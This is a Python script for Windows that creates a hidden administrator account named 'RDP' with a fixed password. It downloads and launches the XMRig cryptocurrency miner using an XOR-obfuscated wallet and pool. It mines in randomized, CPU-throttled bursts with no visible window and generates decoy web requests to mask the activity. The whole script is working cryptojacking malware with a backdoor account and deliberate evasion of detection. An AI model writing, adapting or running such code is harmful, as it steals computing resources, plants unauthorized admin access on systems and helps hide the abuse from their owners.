import os
import sys
import subprocess
import tempfile
import time
import random
import threading
import urllib.request
import zipfile

# Force flush
def debug_print(*args, **kwargs):
    print(*args, **kwargs)
    sys.stdout.flush()

debug_print("=== Script started ===")

# ========== Obfuscated data (XOR key = 85) ==========
ENCODED_WALLET = [
    97, 108, 0, 2, 1, 34, 59, 39, 45, 27, 13, 60, 109, 48, 24, 1, 22, 36, 49, 22, 96, 0, 102, 48, 60, 24, 29, 39, 5, 15, 62, 35, 35, 55, 38, 12, 27, 102, 2, 16, 49, 48, 97, 58, 108, 7, 12, 48, 55, 60, 45, 32, 56, 23, 22, 22, 44, 96, 58, 22, 49, 58, 6, 30, 62, 6, 103, 0, 99, 33, 108, 50, 13, 31, 19, 47, 31, 27, 62, 45, 13, 22, 98, 33, 31, 100, 0, 36, 97, 32, 62, 44, 96, 23, 5
]

ENCODED_POOL = [
    61, 58, 58, 57, 123, 38, 32, 61, 61, 58, 35, 33, 45, 56, 35, 123, 54, 58, 56, 111, 97, 97, 102
]

def decode(encoded, key):
    return ''.join(chr(b ^ key) for b in encoded)

XOR_KEY = int(os.environ.get('XOR_KEY', '0x55'), 16)
WALLET = decode(ENCODED_WALLET, XOR_KEY)
POOL = decode(ENCODED_POOL, XOR_KEY)
TLS_FINGERPRINT = "4633ddff863414b7d28bc4ce3e2966335c082d6e3783c412cc059af107a04dfd"

debug_print(f"Decoded wallet: {WALLET[:10]}...")
debug_print(f"Decoded pool: {POOL}")

# ========== Rest of script ==========
RUNTIME_MINUTES = 180
MIN_WORK = 1
MAX_WORK = 8
MIN_BREAK = 0.5
MAX_BREAK = 3
MIN_CPU_HINT = 5
MAX_CPU_HINT = 25

def create_user():
    debug_print("Creating user...")
    try:
        subprocess.run(['net', 'user', 'RDP', 'Runner-12345', '/add'], check=True, capture_output=True)
        subprocess.run(['net', 'localgroup', 'Administrators', 'RDP', '/add'], check=True)
        debug_print("[+] User 'RDP' created.")
    except subprocess.CalledProcessError as e:
        debug_print(f"[!] User creation failed: {e.stderr.decode()}")

def download_xmrig():
    miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip"
    zip_path = os.path.join(tempfile.gettempdir(), 'xmrig.zip')
    extract_dir = os.path.join(tempfile.gettempdir(), 'xmrig')
    debug_print("[+] Downloading miner...")
    urllib.request.urlretrieve(miner_url, zip_path)
    debug_print("[+] Downloaded. Extracting...")
    with zipfile.ZipFile(zip_path, 'r') as z:
        z.extractall(extract_dir)
    for root, dirs, files in os.walk(extract_dir):
        if 'xmrig.exe' in files:
            exe_path = os.path.join(root, 'xmrig.exe')
            debug_print(f"[+] Miner downloaded to {exe_path}")
            return exe_path
    raise Exception("xmrig.exe not found")

def web_surfer(stop_event):
    urls = [
        "https://www.google.com/favicon.ico",
        "https://github.com/favicon.ico",
        "https://cloudflare.com/favicon.ico",
        "https://microsoft.com/favicon.ico"
    ]
    while not stop_event.is_set():
        url = random.choice(urls)
        try:
            debug_print(f"[Web] Fetching {url}")
            urllib.request.urlretrieve(url, os.devnull)
            debug_print(f"[Web] Fetched {url}")
        except Exception as e:
            debug_print(f"[Web] Error: {e}")
        sleep_time = random.randint(5, 15)
        for _ in range(sleep_time):
            if stop_event.is_set():
                break
            time.sleep(1)

def main():
    create_user()
    exe_path = download_xmrig()
    working_dir = os.path.dirname(exe_path)

    # Delete any existing config files
    config_paths = [
        os.path.join(working_dir, "config.json"),
        os.path.join(os.environ['USERPROFILE'], ".xmrig.json"),
        os.path.join(os.environ['USERPROFILE'], ".config", "xmrig.json")
    ]
    for path in config_paths:
        if os.path.exists(path):
            os.remove(path)
            debug_print(f"[+] Removed {path}")

    stop_event = threading.Event()
    web_thread = threading.Thread(target=web_surfer, args=(stop_event,), daemon=True)
    web_thread.start()
    debug_print("[+] Web surfer thread started.")

    total_start = time.time()
    total_end = total_start + RUNTIME_MINUTES * 60

    while time.time() < total_end:
        work_sec = random.randint(MIN_WORK * 60, MAX_WORK * 60)
        break_sec = random.randint(int(MIN_BREAK * 60), int(MAX_BREAK * 60))
        cpu_hint = random.randint(MIN_CPU_HINT, MAX_CPU_HINT)

        debug_print(f"\n[+] Burst: work {work_sec//60} min, break {break_sec//60} min, CPU hint {cpu_hint}%")

        cmd = [
            exe_path,
            f"--url={POOL}",
            f"--user={WALLET}",
            "--pass=x",
            "--tls",
            f"--tls-fingerprint={TLS_FINGERPRINT}",
            "--keepalive",
            f"--cpu-max-threads-hint={cpu_hint}",
            "--cpu-priority=5",
            "--randomx-mode=fast",
            "--donate-level=1",
            "--no-color"
        ]

        debug_print(f"[+] Starting miner: {' '.join(cmd)}")
        # Run miner and capture output to see errors
        miner_proc = subprocess.Popen(
            cmd,
            cwd=working_dir,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        debug_print(f"[+] Miner started (PID {miner_proc.pid})")

        work_start = time.time()
        while time.time() - work_start < work_sec:
            line = miner_proc.stdout.readline()
            if line:
                debug_print(f"[Miner] {line.strip()}")
            else:
                if miner_proc.poll() is not None:
                    debug_print(f"[!] Miner died. Exit code: {miner_proc.returncode}")
                    break
                time.sleep(0.5)

        if miner_proc.poll() is None:
            miner_proc.terminate()
            miner_proc.wait(timeout=10)
            debug_print("[+] Miner stopped.")
        else:
            debug_print("[+] Miner already stopped.")

        if break_sec > 0:
            debug_print(f"[+] Breaking for {break_sec//60} minutes...")
            for _ in range(break_sec):
                if time.time() >= total_end or stop_event.is_set():
                    break
                time.sleep(1)

    stop_event.set()
    web_thread.join(timeout=10)
    debug_print("[+] Job completed.")

if __name__ == "__main__":
    main()
